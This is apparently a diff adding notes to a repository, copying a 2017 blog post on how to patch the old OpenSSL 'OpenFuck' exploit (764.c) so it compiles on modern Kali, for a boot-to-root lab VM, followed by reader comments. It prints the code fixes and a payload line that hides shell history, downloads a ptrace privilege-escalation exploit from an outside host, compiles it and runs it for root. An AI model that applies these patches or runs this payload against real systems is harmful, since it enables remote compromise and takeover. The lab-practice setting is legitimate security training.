@@ -1,0 +1,167 @@
+Changes need to be made in the OpenFuck script in order to work as the ssl version is newest in Kali
+
+
+
+
+Please refer the below link or details mentioned
+
+https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
+
+Also perform privesc to get root.
+
+Steps 
+
+Hypn.za.net
+Hacking, Coding and Gaming | Twitter: @HypnZA and @HypnInfosec
+
+AUGUST 27, 2017
+Compiling exploit 764.c in 2017 (using libssl-dev 1.1.0f )
+One of the popular boot-to-root VMs has an exploit (764.c) which doesn’t compile so well in modern Kali, producing the errors:
+
+764d.c:643:24: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function)
+764d.c:651:2: error: unknown type name ‘RC4_KEY’
+764d.c:652:2: error: unknown type name ‘RC4_KEY’
+764d.c:844:7: error: ‘MD5_DIGEST_LENGTH’ undeclared (first use in this function)
+764d.c:845:19: error: ‘SSL2_MT_ERROR’ undeclared (first use in this function)
+764d.c:882:2: error: unknown type name ‘MD5_CTX’
+764d.c:887:23: error: ‘MD5_DIGEST_LENGTH’ undeclared (first use in this function)
+764d.c:977:16: error: ‘SSL2_MT_SERVER_HELLO’ undeclared (first use in this function)
+764d.c:1069:10: error: dereferencing pointer to incomplete type ‘EVP_PKEY {aka struct evp_pkey_st}’
+764d.c:1106:2: error: unknown type name ‘MD5_CTX’
+764d.c:1111:42: error: ‘MD5_DIGEST_LENGTH’ undeclared (first use in this function)
+764d.c:1127:23: error: ‘RC4_KEY’ undeclared (first use in this function)
+764d.c:1127:31: error: expected expression before ‘)’ token
+764d.c:1131:32: error: expected expression before ‘)’ token
+764d.c:1146:16: error: ‘SSL2_MT_SERVER_VERIFY’ undeclared (first use in this function)
+764d.c:1158:11: error: ‘SSL2_MT_CLIENT_FINISHED’ undeclared (first use in this function)
+764d.c:1171:16: error: ‘SSL2_MT_SERVER_FINISHED’ undeclared (first use in this function)
+
+
+Luckily there was a blog post written in 2014 by @paulwebsec explaining how to update the exploit, which fixes some of them but still leaves you with:
+
+764b.c:645:24: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function)
+764b.c:847:19: error: ‘SSL2_MT_ERROR’ undeclared (first use in this function)
+764b.c:979:16: error: ‘SSL2_MT_SERVER_HELLO’ undeclared (first use in this function)
+764b.c:1071:10: error: dereferencing pointer to incomplete type ‘EVP_PKEY {aka struct evp_pkey_st}’
+764b.c:1148:16: error: ‘SSL2_MT_SERVER_VERIFY’ undeclared (first use in this function)
+764b.c:1160:11: error: ‘SSL2_MT_CLIENT_FINISHED’ undeclared (first use in this function)
+764b.c:1173:16: error: ‘SSL2_MT_SERVER_FINISHED’ undeclared (first use in this function)
+
+On Kali (and likely other Debian based distros) you can work around this by simply doing an “apt-get install libssl1.0-dev” to roll back your libssl-dev version, but why don’t we get this compiling with the modern lib…
+
+Then changes to make (including Paul’s) are:
+
+1. Add this below line 24 (the last #include):
+
+#include <openssl/rc4.h>
+#include <openssl/md5.h>
+
+#define SSL2_MT_ERROR 0
+#define SSL2_MT_CLIENT_FINISHED 3
+#define SSL2_MT_SERVER_HELLO 4
+#define SSL2_MT_SERVER_VERIFY 5
+#define SSL2_MT_SERVER_FINISHED 6
+#define SSL2_MAX_CONNECTION_ID_LENGTH 16
+
+2. Replace “COMMAND2” on (now) line 672:
+
+#define COMMAND2 “unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n”
+
+3. Add “const” to the beginning of (now) line 970:
+
+const unsigned char *p, *end;
+
+4. Replace the “if” on (now) line 1078 with:
+
+if (EVP_PKEY_get1_RSA(pkey) == NULL) {
+
+5. Replace the “encrypted_key_length” code on (now) line 1084 with:
+
+encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
+
+6. Install “libssl-dev” (if not already installed):
+
+apt–get install libssl–dev
+
+7. Compile!
+
+# gcc -o 764 764.c -lcrypto
+
+ 
+
+Related Posts
+MySQL + Homebrew (Mac) errors + fixes
+18 September 2012
+When I hate being a coder... #2
+11 November 2010
+ASCII Skulls
+25 June 2017
+6 Comments
+
+Sealmindset 
+April 28, 2018 at 12:28 am
+On Linux kali 4.15.0-kali2-amd64 #1 SMP Debian 4.15.11-1kali1 (2018-03-21) x86_64 GNU/Linux
+With libssl-dev and not libssl1.0-dev
+Got this using the steps outlined above:
+764.c:672:18: error: ‘unset’ undeclared (first use in this function); did you mean ‘rset’?
+…
+Perform all the step again, except skipped step #2
+Compiles and functional!
+
+BTW, Thank you!
+
+
+anon 
+September 9, 2018 at 11:41 pm
+I only got this to work with apt-get install libssl1.0-dev
+Installing libssl-dev alone or in conjunction overwrites the libssl import directives and it wont compile.
+
+Thanks for the exploit!
+
+
+haktor5 
+July 6, 2018 at 5:02 pm
+Thank you so much for this! It’s unbelievable how often exploits need to be updated.
+Exploit is written in 2003, had to be updated in 2014 and 2015. Now it was still not working without your updates. 🙂
+Much appreciated..
+
+
+haktor5 
+July 6, 2018 at 9:38 pm
+Last thing: 764.c uses wget to download and compile ptrace-kmod.c unsuccessfully if you run kioptrix in an isolated network. I had to install c code on my kali and compile it on kioptrix to make it work.
+
+
+Moni 
+August 1, 2018 at 3:25 pm
+I would hug you if I could! Thankyou so much! this exploit was making me pull my hair for last couple hours! THANKS AGAIN!
+
+
+sbobet mobile 
+August 9, 2018 at 7:01 am
+Great article.
+
+Leave a Reply
+Your email address will not be published. Required fields are marked *
+
+Comment
+
+
+Name *
+
+
+Email *
+
+
+Website
+
+
+This site uses Akismet to reduce spam. Learn how your comment data is processed.
+
+RECENT POSTS
+Password cracking and Hashcat stuff
+SANS Holiday Hack 2018 “KringleCon” (partial) Writeup
+SterKinekor “seats that don’t leave a single space” stupidity and bypass
+CATEGORIES
+
+ARCHIVES
+
